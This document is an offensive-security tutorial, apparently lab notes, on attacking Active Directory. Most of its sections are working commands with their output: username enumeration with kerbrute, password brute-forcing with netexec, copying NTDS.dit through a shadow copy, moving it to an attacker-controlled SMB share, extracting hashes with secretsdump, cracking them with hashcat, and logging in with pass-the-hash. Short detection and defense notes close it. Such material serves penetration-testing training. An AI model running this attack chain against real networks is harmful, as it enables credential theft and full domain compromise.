# Attacking Active Directory and NTDS.dit

Active Directory (AD) is a critical directory service in Windows enterprise environments. Any organization using Windows at scale will almost certainly rely on AD to manage authentication, authorization, and resources. Because of its central role, AD is a prime target during offensive security engagements.

This document focuses on:
- Dictionary attacks against Active Directory accounts
- Extracting credential hashes from the `NTDS.dit` database
- Post-exploitation use of hashes (cracking and Pass-the-Hash)

> **Context**: These techniques assume an **internal network foothold** (post-initial compromise). They are typically not the first step of an attack.

---

## 1. Active Directory Authentication Overview

Once a Windows system is joined to a domain:
- Authentication requests are sent to the **Domain Controller (DC)**.
- The local **SAM database** is no longer used by default for domain logons.
- Local accounts can still be used by specifying:
  - `HOSTNAME\username`
  - `.\username` (at the login UI)

Understanding which authentication source is used (AD vs SAM) is essential when planning attacks or defenses.

---

## 2. Dictionary Attacks Against AD Accounts

A dictionary attack attempts to authenticate using:
- A list of **potential usernames**
- A list of **potential passwords**

⚠️ These attacks are **noisy**:
- Generate many authentication events
- May trigger alerts
- Can cause account lockouts if policies are enforced

---

## 3. Building a Username List

Usernames often follow predictable conventions derived from real names.

### Common Username Conventions

| Convention | Example (Jane Jill Doe) |
|----------|-------------------------|
| firstinitiallastname | jdoe |
| firstinitialmiddleinitiallastname | jjdoe |
| firstnamelastname | janedoe |
| firstname.lastname | jane.doe |
| lastname.firstname | doe.jane |
| nickname | doedoehacksstuff |

Email addresses often reveal the format:
```

[jdoe@company.com](mailto:jdoe@company.com) → username: jdoe

````

### OSINT Tips
- Google the domain (e.g. `@company.com`)
- Search PDFs: `company.com filetype:pdf`
- Extract usernames from document metadata
- Some orgs use aliased usernames (e.g. `a907`) to reduce spraying effectiveness

---

## 4. Generating Username Lists

### Manual List Example

```text
bwilliamson
benwilliamson
ben.williamson
williamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
````

### Automated Generation (Username Anarchy)

Input: real names
Output: common username formats

This saves time but works best when combined with prior knowledge of the organization’s naming convention.

---

## 5. Enumerating Valid Usernames (Kerbrute)

Before guessing passwords, verify which usernames actually exist.

Example:

```bash
kerbrute userenum \
  --dc 10.129.201.57 \
  --domain inlanefreight.local \
  names.txt
```

Output:

```
[+] VALID USERNAME: bwilliamson@inlanefreight.local
```

This reduces unnecessary login attempts.

---

## 6. Brute-Forcing Credentials (NetExec)

Once valid usernames are identified, passwords can be tested.

Example:

```bash
netexec smb 10.129.201.57 \
  -u bwilliamson \
  -p /usr/share/wordlists/fasttrack.txt
```

Successful login:

```
[+] inlanefreight.local\bwilliamson:P@55w0rd!
```

⚠️ Default AD configurations may **not** enforce account lockouts.

---

## 7. Evidence Left Behind

Windows logs authentication activity:

* **Event ID 4776** (NTLM authentication)
* Visible in **Event Viewer → Security logs**

These logs are critical for detection and incident response.

---

## 8. Accessing the Domain Controller

With valid credentials:

```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Check privileges:

```powershell
net localgroup
net user bwilliamson
```

To dump `NTDS.dit`, the account must have:

* Local Administrator
* Domain Admin (or equivalent)

---

## 9. NTDS.dit Overview

* Location: `%SystemRoot%\NTDS\NTDS.dit`
* Stores:

  * All domain usernames
  * NTLM hashes
  * Kerberos keys
  * AD schema data

Compromising this file effectively compromises the **entire domain**.

---

## 10. Dumping NTDS.dit via Volume Shadow Copy

### Create a Shadow Copy

```powershell
vssadmin CREATE SHADOW /For=C:
```

### Copy NTDS.dit

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

⚠️ The `SYSTEM` hive is also required to decrypt hashes.

---

## 11. Transferring Files

Move files to an attacker-controlled SMB share:

```powershell
move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

---

## 12. Extracting Hashes (Impacket)

```bash
impacket-secretsdump \
  -ntds NTDS.dit \
  -system SYSTEM \
  LOCAL
```

Output:

```
Administrator:500:LMHASH:NTHASH:::
krbtgt:502:LMHASH:NTHASH:::
```

---

## 13. Faster Method: NetExec NTDS Dump

Single-command alternative:

```bash
netexec smb 10.129.201.57 \
  -u bwilliamson \
  -p P@55w0rd! \
  -M ntdsutil
```

This:

* Creates a VSS snapshot
* Dumps `NTDS.dit`
* Extracts hashes automatically

---

## 14. Cracking Hashes (Hashcat)

Example NTLM crack:

```bash
hashcat -m 1000 \
  64f12cddaa88057e06a81b54e73b949b \
  /usr/share/wordlists/rockyou.txt
```

Result:

```
Password1
```

---

## 15. Pass-the-Hash (PtH)

If cracking fails, hashes can still be used for authentication via NTLM.

Example:

```bash
evil-winrm -i 10.129.201.57 \
  -u Administrator \
  -H 64f12cddaa88057e06a81b54e73b949b
```

PtH is especially useful for **lateral movement**.

---

## Key Takeaways

* AD is a high-value target
* Username enumeration reduces noise
* NTDS.dit compromise = full domain compromise
* Protect DCs with:

  * Strong passwords
  * Account lockout policies
  * Tiered admin access
  * Monitoring of authentication events
